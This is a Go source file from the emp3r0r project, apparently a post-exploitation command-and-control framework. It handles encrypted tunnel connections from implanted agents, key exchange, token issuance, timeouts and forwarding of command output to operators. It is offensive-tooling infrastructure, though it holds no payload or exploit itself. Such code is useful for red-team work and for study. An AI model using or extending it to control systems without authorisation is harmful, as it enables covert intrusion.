package server

import (
	"context"
	"net/http"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

const maxCmdResultCacheBytes = 1024 * 1024 // 1 MiB

// handleMessageTunnel processes CBOR C&C tunnel connections.
func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleMessageTunnel panic: %v\n%s", r, util.CallStack())
			http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		}
	}()
	var lastHandshake int64
	atomic.StoreInt64(&lastHandshake, time.Now().Unix())
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		logging.Errorf("handleMessageTunnel: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	// Global Encryption: Wrap connection
	secureConn := transport.NewSecureConn(conn)

	ctx, cancel := context.WithCancel(req.Context())
	var wg sync.WaitGroup
	defer func() {
		logging.Debugf("handleMessageTunnel exiting")
		cancel()  // Signal goroutine to stop
		wg.Wait() // Wait for goroutine to finish before returning
		live.AgentControlMap.Range(func(key, value interface{}) bool {
			t := key.(*def.Emp3r0rAgent)
			c := value.(*live.AgentControl)
			if c.Conn == secureConn {
				live.AgentControlMap.Delete(t)
				controllers.CleanupPortFwdsByAgent(t)
				operatorBroadcastPrintf(logging.ERROR, "Agent dies... %s is disconnected", strconv.Quote(t.Name))
				return false // stop iteration
			}
			return true
		})
		_ = conn.Close()
		logging.Debugf("handleMessageTunnel exited")
	}()
	in := cbor.NewDecoder(secureConn)
	// Track PFS state for this connection
	var pfsEstablished bool

	wg.Add(1)
	go func() {
		defer wg.Done()
		defer cancel()
		for ctx.Err() == nil {
			var msg def.MsgTunData
			err = in.Decode(&msg)
			if err != nil {
				return
			}
			// Sanitize agent metadata at trust boundary (after CBOR decode)
			util.SanitizeMsgTunMetadata(&msg)

			// find agent
			var agent *def.Emp3r0rAgent
			for i := 0; i < 5; i++ {
				// prefer UUID
				if msg.AgentUUID != "" {
					agent = agents.GetAgentByUUID(msg.AgentUUID)
				}
				if agent == nil {
					agent = agents.GetAgentByTag(msg.Tag)
				}
				if agent != nil {
					break
				}
				time.Sleep(100 * time.Millisecond)
			}
			if agent == nil {
				logging.Errorf("handleMessageTunnel: No agent found for message: %v", msg)
				return
			}

			// Agent authentication already verified via HTTP headers in dispatcher
			shortname := agent.Name
			if val, ok := live.AgentControlMap.Load(agent); ok {
				ctrl := val.(*live.AgentControl)
				if ctrl.Conn == nil {
					operatorBroadcastPrintf(logging.SUCCESS,
						"Knock.. Knock... Agent %s is connected",
						strconv.Quote(shortname))
				}
				// Update control info and publish via Store to ensure memory visibility
				ctrl.Conn = secureConn
				ctrl.Ctx = ctx
				ctrl.Cancel = cancel
				live.AgentControlMap.Store(agent, ctrl)
			}

			agent.LastSeen = time.Now()
			if msg.Time != "" {
				start_time, err := time.Parse("2006-01-02 15:04:05.999999999 -0700 MST", msg.Time)
				if err == nil {
					agent.LastSeenRTT = time.Since(start_time)
				}
			}
			// handshake (hello) message has empty CmdSlice or just random data
			// but it's used to tell CC that agent is alive
			// here we just respond to keep-alive if it matches any criteria
			// or if it's explicitly a hello
			if msg.Response == nil && len(msg.CmdSlice) > 0 {
				// Check if context is still valid before writing
				if ctx.Err() != nil {
					logging.Debugf("Context cancelled, skipping handshake response")
					return
				}
				// verify hello
				logging.Debugf("Handshake from %s successful", msg.Tag)

				// ECDH Key Exchange Support
				replyData, sessionKey, err := processKeyExchange(&msg, pfsEstablished)
				if err != nil {
					logging.Errorf("Handshake processing error: %v", err)
					return
				}

				// respond with Server Public Key (or random data), wrapped in MsgTunData
				replyMsg := def.MsgTunData{
					JobID:    msg.JobID,
					Tag:      "handshake",
					Response: replyData,
				}
				encoder := cbor.NewEncoder(secureConn)
				err = encoder.Encode(replyMsg)
				if err != nil {
					logging.Warningf("handleMessageTunnel: %v", err)
				} else if sessionKey != nil {
					// 6. Switch to Session Key (only if exchange was successful)
					secureConn.SetKey(sessionKey)
					if !pfsEstablished {
						logging.Infof("SecureConn: Switched to ephemeral session key for %s (PFS enabled)", msg.Tag)
						pfsEstablished = true
					} else {
						logging.Debugf("SecureConn: Re-keyed ephemeral session key for %s", msg.Tag)
					}
				}

				atomic.StoreInt64(&lastHandshake, time.Now().Unix())

				// Issue AgentToken if missing or expiring within 6 hours.
				// Trust condition: agent has a live MsgTun session (checked-in + communicating).
				needsToken := agent.AgentToken == nil ||
					time.Until(time.Unix(agent.AgentToken.ExpiresAt, 0)) < 6*time.Hour
				if needsToken {
					tok, err := SignAgentToken(agent.UUID, agent.From, def.CapabilityProxy, 24*time.Hour)
					if err != nil {
						logging.Errorf("handleMessageTunnel: SignAgentToken for %s: %v", agent.Name, err)
					} else {
						tokData, _ := cbor.Marshal(tok)
						tokMsg := def.MsgTunData{
							Tag:      def.TagAgentToken,
							Response: tokData,
						}
						if err := encoder.Encode(tokMsg); err != nil {
							logging.Errorf("handleMessageTunnel: send AgentToken to %s: %v", agent.Name, err)
						} else {
							logging.Infof("Sent AgentToken(cap=proxy) to %s", agent.Name)
							agent.AgentToken = tok
						}
					}
				}

				continue // Handshake handled, next message
			}

			// if not a handshake, forward message to operators
			// also cache it for automated tests or local usage
			if msg.JobID != "" {
				if _, knownJob := live.CmdTime.Load(msg.JobID); knownJob {
					responseToCache := msg.Response
					if len(responseToCache) > maxCmdResultCacheBytes {
						logging.Warningf("handleMessageTunnel: truncating oversized response for job %s from %d to %d bytes", strconv.Quote(msg.JobID), len(responseToCache), maxCmdResultCacheBytes)
						responseToCache = responseToCache[:maxCmdResultCacheBytes]
					}
					live.CmdResults.Store(msg.JobID, string(responseToCache))
					// persistence
					jobs.HandleOutput(msg.JobID, responseToCache)
				} else {
					logging.Warningf("handleMessageTunnel: dropping response for unknown job ID %s", strconv.Quote(msg.JobID))
				}
			}
			err = fwdMsg2Operators(msg)
			if err != nil {
				logging.Warningf("handleMessageTunnel: %v", err)
				return
			}
		}
	}()
	for ctx.Err() == nil {
		lastHandshakeTime := time.Unix(atomic.LoadInt64(&lastHandshake), 0)
		if time.Since(lastHandshakeTime) > 2*time.Minute {
			operatorBroadcastPrintf(logging.WARN, "handleMessageTunnel: timeout for agent")
			return
		}
		util.TakeABlink()
	}
}
